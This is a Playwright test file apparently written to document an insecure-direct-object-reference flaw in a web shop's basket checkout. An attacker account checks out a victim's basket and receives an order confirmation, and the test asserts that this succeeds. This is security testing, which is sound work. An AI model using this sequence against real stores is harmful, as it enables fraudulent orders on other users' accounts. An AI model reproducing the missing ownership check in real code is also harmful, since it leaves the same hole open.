import { test, expect } from '@playwright/test';
import { addToBasket, checkout, createLoggedInUser, getFirstProduct } from '../helpers/api';

/**
 * Critical: this is the basket IDOR (see basket-idor.spec.ts) carried all
 * the way through to a real order. It's the difference between "a leaky
 * read" and "an attacker can complete a purchase using someone else's
 * basket" — same root cause (POST /rest/basket/{id}/checkout never checks
 * ownership of {id}), much bigger blast radius: fraudulent orders billed
 * to the victim's basket contents, confirmed with a real order number.
 */
test('VULNERABILITY: a user can check out using another user\'s basket', async ({ request }) => {
  const victim = await createLoggedInUser(request);
  const attacker = await createLoggedInUser(request);
  const product = await getFirstProduct(request);

  // Victim adds something to their own basket, using their own token.
  const addRes = await addToBasket(request, victim.token, victim.basketId, product.id, 1);
  expect(addRes.ok()).toBe(true);

  // Attacker checks out the VICTIM's basket id, authenticated as themself.
  const checkoutRes = await checkout(request, attacker.token, victim.basketId);

  // This SHOULD be 403 Forbidden. It is not — the order goes through.
  expect(checkoutRes.status()).toBe(200);
  const body = await checkoutRes.json();
  expect(body.orderConfirmation).toBeTruthy();
});
